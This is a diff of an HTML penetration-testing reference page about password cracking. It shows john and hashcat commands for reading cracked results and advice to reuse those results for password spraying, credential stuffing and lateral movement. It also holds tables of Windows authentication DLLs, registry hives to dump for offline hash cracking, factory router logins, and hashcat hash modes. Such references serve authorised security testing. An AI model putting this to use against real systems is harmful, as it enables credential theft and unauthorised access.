-                  <div class="pc-node-body"><p>Both tools store cracked results. john --show reads them back reliably; hashcat --show prints them from the potfile (re-run with the same -m and hash file). Note which credential came from which host and account, keep the loot with the rest of the engagement notes, treat cracked passwords as sensitive, and feed them into lateral movement where the scope allows.</p><pre class="pc-cmd"><code>john --show hashes
+                  <div class="pc-node-body"><p>Both tools store cracked results. john --show reads them back reliably; hashcat --show prints them from the potfile (re-run with the same -m and hash file). Note which credential came from which host and account, keep the loot with the rest of the engagement notes, treat cracked passwords as sensitive, and feed them back into spraying, stuffing and lateral movement where the scope allows.</p><pre class="pc-cmd"><code>john --show hashes
 hashcat -m 1000 ntlm.txt --show</code></pre></div>
                 </details>
               </li>
@@ -415,6 +630,79 @@ hashcat -m 1000 ntlm.txt --show</code></pre></div>
               </tbody>
             </table>
             <p class="pc-ref-empty" data-ref-empty="hc-rule-funcs" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-auth-packages" aria-labelledby="pcref-auth-packages-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-auth-packages-title">Windows authentication packages</h2>
+            <p class="pc-ref-intro">The DLLs LSASS loads to perform authentication checks. Filter by package or role.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-auth-packages-q">Filter windows authentication packages</label>
+            <input class="tool-input pc-ref-input" id="pcref-auth-packages-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="auth-packages" />
+            <span class="pc-ref-count" data-ref-count="auth-packages" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="auth-packages">
+              <thead><tr><th scope="col">Package</th><th scope="col">Role</th></tr></thead>
+              <tbody>
+                <tr data-search="lsasrv.dll lsa server: enforces security policy and manages the lsa&#39;s security packages; holds the negotiate function that picks ntlm or kerberos"><td><code>Lsasrv.dll</code></td><td>LSA server: enforces security policy and manages the LSA&#39;s security packages; holds the Negotiate function that picks NTLM or Kerberos</td></tr>
+                <tr data-search="msv1_0.dll authentication package for local-machine logons that need no custom authentication (ntlm)"><td><code>Msv1_0.dll</code></td><td>Authentication package for local-machine logons that need no custom authentication (NTLM)</td></tr>
+                <tr data-search="samsrv.dll security accounts manager: stores local accounts, enforces local policy, exposes the sam apis"><td><code>Samsrv.dll</code></td><td>Security Accounts Manager: stores local accounts, enforces local policy, exposes the SAM APIs</td></tr>
+                <tr data-search="kerberos.dll kerberos authentication package loaded by the lsa"><td><code>Kerberos.dll</code></td><td>Kerberos authentication package loaded by the LSA</td></tr>
+                <tr data-search="netlogon.dll network logon service"><td><code>Netlogon.dll</code></td><td>Network logon service</td></tr>
+                <tr data-search="ntdsa.dll directory system agent: manages the ad database (ntds.dit), ldap queries and dc replication; loaded on domain controllers only"><td><code>Ntdsa.dll</code></td><td>Directory System Agent: manages the AD database (ntds.dit), LDAP queries and DC replication; loaded on Domain Controllers only</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="auth-packages" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-registry-hives" aria-labelledby="pcref-registry-hives-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-registry-hives-title">Registry hives for hash dumping</h2>
+            <p class="pc-ref-intro">Back these up with reg.exe (local admin) and crack offline. Filter by hive or description.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-registry-hives-q">Filter registry hives for hash dumping</label>
+            <input class="tool-input pc-ref-input" id="pcref-registry-hives-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="registry-hives" />
+            <span class="pc-ref-count" data-ref-count="registry-hives" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="registry-hives">
+              <thead><tr><th scope="col">Hive</th><th scope="col">What it holds</th></tr></thead>
+              <tbody>
+                <tr data-search="hklm\sam password hashes for local accounts (lm/ntlm); crackable once decrypted"><td><code>HKLM\SAM</code></td><td>Password hashes for local accounts (LM/NTLM); crackable once decrypted</td></tr>
+                <tr data-search="hklm\system the system boot key that encrypts the sam; required to decrypt the hashes"><td><code>HKLM\SYSTEM</code></td><td>The system boot key that encrypts the SAM; required to decrypt the hashes</td></tr>
+                <tr data-search="hklm\security lsa secrets: cached domain credentials (dcc2), cleartext passwords, dpapi keys and more"><td><code>HKLM\SECURITY</code></td><td>LSA secrets: cached domain credentials (DCC2), cleartext passwords, DPAPI keys and more</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="registry-hives" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-router-defaults" aria-labelledby="pcref-router-defaults-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-router-defaults-title">Router default credentials</h2>
+            <p class="pc-ref-intro">A sample of common factory logins; internal test routers are the ones most likely left unchanged. Filter by brand.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-router-defaults-q">Filter router default credentials</label>
+            <input class="tool-input pc-ref-input" id="pcref-router-defaults-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="router-defaults" />
+            <span class="pc-ref-count" data-ref-count="router-defaults" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="router-defaults">
+              <thead><tr><th scope="col">Brand</th><th scope="col">Default IP</th><th scope="col">Username</th><th scope="col">Password</th></tr></thead>
+              <tbody>
+                <tr data-search="3com http://192.168.1.1 admin admin"><td>3Com</td><td><code>http://192.168.1.1</code></td><td><code>admin</code></td><td><code>Admin</code></td></tr>
+                <tr data-search="belkin http://192.168.2.1 admin admin"><td>Belkin</td><td><code>http://192.168.2.1</code></td><td><code>admin</code></td><td><code>admin</code></td></tr>
+                <tr data-search="benq http://192.168.1.1 admin admin"><td>BenQ</td><td><code>http://192.168.1.1</code></td><td><code>admin</code></td><td><code>Admin</code></td></tr>
+                <tr data-search="d-link http://192.168.0.1 admin admin"><td>D-Link</td><td><code>http://192.168.0.1</code></td><td><code>admin</code></td><td><code>Admin</code></td></tr>
+                <tr data-search="digicom http://192.168.1.254 admin michelangelo"><td>Digicom</td><td><code>http://192.168.1.254</code></td><td><code>admin</code></td><td><code>Michelangelo</code></td></tr>
+                <tr data-search="linksys http://192.168.1.1 admin admin"><td>Linksys</td><td><code>http://192.168.1.1</code></td><td><code>admin</code></td><td><code>Admin</code></td></tr>
+                <tr data-search="netgear http://192.168.0.1 admin password"><td>Netgear</td><td><code>http://192.168.0.1</code></td><td><code>admin</code></td><td><code>password</code></td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="router-defaults" hidden>No match. Try a format name, a value, or clear the filter.</p>
           </div>
         </section>
         <section class="pc-ref" id="pcref-john-formats" aria-labelledby="pcref-john-formats-title">
@@ -527,13 +815,13 @@ hashcat -m 1000 ntlm.txt --show</code></pre></div>
                 <tr data-search="70 md5(utf16le($pass)) raw hash"><td><code>70</code></td><td>md5(utf16le($pass))</td><td>Raw Hash</td></tr>
                 <tr data-search="500 md5 crypt ($1$, cisco-ios, freebsd) operating system"><td><code>500</code></td><td>MD5 Crypt ($1$, Cisco-IOS, FreeBSD)</td><td>Operating System</td></tr>
                 <tr data-search="1800 sha512crypt ($6$, shadow) operating system"><td><code>1800</code></td><td>sha512crypt ($6$, shadow)</td><td>Operating System</td></tr>
-                <tr data-search="1000 ntlm operating system"><td><code>1000</code></td><td>NTLM</td><td>Operating System</td></tr>
+                <tr data-search="1000 ntlm (nt hash) operating system"><td><code>1000</code></td><td>NTLM (NT hash)</td><td>Operating System</td></tr>
                 <tr data-search="3000 lm operating system"><td><code>3000</code></td><td>LM</td><td>Operating System</td></tr>
+                <tr data-search="2100 domain cached credentials 2 (dcc2 / mscash2) operating system"><td><code>2100</code></td><td>Domain Cached Credentials 2 (DCC2 / mscash2)</td><td>Operating System</td></tr>
                 <tr data-search="5500 netntlmv1 network protocol"><td><code>5500</code></td><td>NetNTLMv1</td><td>Network Protocol</td></tr>
                 <tr data-search="5600 netntlmv2 network protocol"><td><code>5600</code></td><td>NetNTLMv2</td><td>Network Protocol</td></tr>
                 <tr data-search="13100 kerberos 5 tgs-rep (kerberoast) network protocol"><td><code>13100</code></td><td>Kerberos 5 TGS-REP (Kerberoast)</td><td>Network Protocol</td></tr>
                 <tr data-search="18200 kerberos 5 as-rep network protocol"><td><code>18200</code></td><td>Kerberos 5 AS-REP</td><td>Network Protocol</td></tr>
-                <tr data-search="2100 domain cached credentials 2 (mscash2) operating system"><td><code>2100</code></td><td>Domain Cached Credentials 2 (mscash2)</td><td>Operating System</td></tr>
                 <tr data-search="13400 keepass password manager"><td><code>13400</code></td><td>KeePass</td><td>Password Manager</td></tr>
                 <tr data-search="13600 winzip archive"><td><code>13600</code></td><td>WinZip</td><td>Archive</td></tr>
                 <tr data-search="17200 pkzip (compressed) archive"><td><code>17200</code></td><td>PKZIP (compressed)</td><td>Archive</td></tr>
